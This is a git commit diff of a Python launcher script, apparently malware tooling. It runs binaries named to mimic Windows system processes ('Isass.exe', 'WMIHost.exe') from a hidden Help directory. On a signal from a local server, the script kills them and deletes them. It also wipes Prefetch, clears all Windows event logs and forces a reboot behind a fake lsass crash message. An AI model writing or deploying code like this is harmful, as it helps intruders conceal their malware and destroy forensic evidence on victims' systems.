e2498b9dc6955e40c7c0f544606b4c18e2284bcb
Elektro-On-Github <138938647+Elektro-On-Github@users.noreply.github.com>
2025-06-29 15:27:29 +0200

    Update starter.py

--- starter.py
+++ starter.py
@@ -2,12 +2,10 @@ import subprocess
 import time
 import requests
 
-subprocess.run("start wuasrv.exe -f 5633", shell=True)
-time.sleep(10)
-subprocess.run("start Isass.exe", shell=True)
-time.sleep(5)
-subprocess.run("start WMIHost.exe", shell=True)
-time.sleep(10)
+subprocess.run(r"C:\WINDOWS\Help\mui\0563\DIAgnostic\wuasrv.exe -f 5633", shell=True)
+subprocess.run(r"C:\WINDOWS\Help\mui\0563\DIAgnostic\Isass.exe", shell=True)
+subprocess.run(r"C:\WINDOWS\Help\mui\0563\DIAgnostic\WMIHost.exe", shell=True)
+
 
 r = requests.get("http://127.0.0.1:5633/clean.txt")
 
@@ -15,19 +13,19 @@ cleanlogs = """cmd /c "for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.e
 restart = r'shutdown /r /t 120 /c "The system process “lsass.exe” terminated unexpectedly with status code -1073741819. The system will restart in 2 minute..."'
 
 if r.status_code == 200:
-    subprocess.run("TASKKILL /f /im Isass.exe", shell=True)
+    subprocess.run(r"TASKKILL /f /im Isass.exe", shell=True)
     time.sleep(1)
-    subprocess.run("TASKKILL /f /im WMIHost.exe", shell=True)
+    subprocess.run(r"TASKKILL /f /im WMIHost.exe", shell=True)
     time.sleep(1)
-    subprocess.run("TASKKILL /f /im wuasrv.exe", shell=True)
+    subprocess.run(r"TASKKILL /f /im wuasrv.exe", shell=True)
     time.sleep(1)
-    subprocess.run("del /f /s /q C:\Windows\Help\mui\0563\DIAgnostic\*.exe")
+    subprocess.run(r"del /f /s /q C:\Windows\Help\mui\0563\DIAgnostic\*.exe")
     time.sleep(1)
-    subprocess.run("del /f /s /q C:\Windows\Prefetch\*.*")
+    subprocess.run(r"del /f /s /q C:\Windows\Prefetch\*.*")
     time.sleep(1)
     subprocess.run(cleanlogs, shell=True)
     time.sleep(1)
-    subprocess.run("sfc /scannow", shell=True)
+    subprocess.run(r"sfc /scannow", shell=True)
     subprocess.run(restart, shell=True)
 
     
